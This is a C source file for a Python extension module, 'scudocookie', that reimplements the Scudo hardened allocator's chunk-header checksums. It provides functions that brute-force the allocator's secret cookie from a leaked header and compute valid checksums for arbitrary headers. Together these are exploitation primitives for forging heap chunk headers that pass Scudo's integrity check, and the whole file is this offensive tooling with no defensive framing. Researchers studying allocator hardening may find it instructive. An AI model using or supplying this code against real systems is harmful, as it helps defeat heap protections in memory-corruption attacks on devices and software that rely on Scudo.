#define PY_SSIZE_T_CLEAN
#include <Python.h>

#include <sys/types.h>
#include <stdio.h>
#include <immintrin.h>

static u_int16_t _calc_checksum(u_int32_t cookie, unsigned long address, unsigned long header) {
    u_int32_t _crc = cookie;
    _crc = _mm_crc32_u64(_crc, address);
    _crc = _mm_crc32_u64(_crc, header);
    _crc = _crc ^ (_crc >> 16);
    
    return _crc & 0xffff;
}

static u_int16_t _calc_bsd_checksum(u_int16_t cookie, unsigned long address, unsigned long header) {
    u_int16_t _crc = cookie;
    for (unsigned char I = 0; I < sizeof(address); ++I) {
        _crc = (_crc >> 1) | ((_crc & 1) << 15);
        _crc = _crc + ((address >> (I*8)) & 0xff);
    }
    for (unsigned char I = 0; I < sizeof(header); ++I) {
        _crc = (_crc >> 1) | ((_crc & 1) << 15);
        _crc = _crc + ((header >> (I*8)) & 0xff);
    }

    return _crc;
}


static PyObject * bruteforce_headerleak(PyObject *self, PyObject *args) {
        unsigned long address;
        unsigned int checksum;
        unsigned long header;

        if (!PyArg_ParseTuple(args, "kIk", &address, &checksum, &header))
                return NULL;
        unsigned int cookie = 0;
        unsigned int _crc = 0;

        while (_crc != checksum) {
            ++cookie;
            _crc = _calc_checksum(cookie, address, header);
        }

        //fprintf(stderr, "Bruteforced Cookie: %x Checksum: %x address: %lx header: %lx\n", cookie, _crc, address, header);
        return PyLong_FromLong(cookie);
}

static PyObject * bruteforce_bsd_headerleak(PyObject *self, PyObject *args) {
        unsigned long address;
        unsigned int checksum;
        unsigned long header;

        if (!PyArg_ParseTuple(args, "kIk", &address, &checksum, &header))
                return NULL;
        unsigned int cookie = 0;
        unsigned int _crc = 0;

        while (_crc != checksum) {
            ++cookie;
            _crc = _calc_bsd_checksum(cookie, address, header);
        }

        //fprintf(stderr, "Bruteforced Cookie: %x Checksum: %x address: %lx header: %lx\n", cookie, _crc, address, header);
        return PyLong_FromLong(cookie);
}

static PyObject * calc_checksum(PyObject *self, PyObject *args) {
        unsigned long address;
        unsigned int cookie;
        unsigned long header;

        if (!PyArg_ParseTuple(args, "kIk", &address, &cookie, &header))
                return NULL;

        unsigned int _crc = 0;
        
        _crc = _calc_checksum(cookie, address, header);
        //fprintf(stderr, "Calculated Cookie: %x Checksum: %x address: %lx header: %lx\n", cookie, _crc, address, header);
        
        return PyLong_FromLong(_crc);
}

static PyObject * calc_bsd_checksum(PyObject *self, PyObject *args) {
        unsigned long address;
        unsigned int cookie;
        unsigned long header;

        if (!PyArg_ParseTuple(args, "kIk", &address, &cookie, &header))
                return NULL;

        unsigned int _crc = 0;
        
        _crc = _calc_bsd_checksum(cookie, address, header);
        //fprintf(stderr, "Calculated Cookie: %x Checksum: %x address: %lx header: %lx\n", cookie, _crc, address, header);
        
        return PyLong_FromLong(_crc);
}

static PyMethodDef ScudoCookieMethods[] = {
    {"bruteforce", bruteforce_headerleak, METH_VARARGS,
     "Bruteforce the cookie from header leak."},
    {"calc_checksum", calc_checksum, METH_VARARGS,
     "Calculate the checksum for a header with the cookie."},
    {"bruteforce_bsd", bruteforce_bsd_headerleak, METH_VARARGS,
     "Bruteforce the cookie from header leak using BSD checksum."},
    {"calc_checksum_bsd", calc_bsd_checksum, METH_VARARGS,
     "Calculate the BSD checksum for a header with the cookie."},
    {NULL, NULL, 0, NULL} /* Sentinel */
};

static struct PyModuleDef scudocookiemodule = {
    PyModuleDef_HEAD_INIT,
    "scudocookie",   /* name of module */
    NULL, /* module documentation, may be NULL */
    -1,       /* size of per-interpreter state of the module,
                 or -1 if the module keeps state in global variables. */
    ScudoCookieMethods
};

PyMODINIT_FUNC PyInit_scudocookie(void) {
        return PyModule_Create(&scudocookiemodule);
}
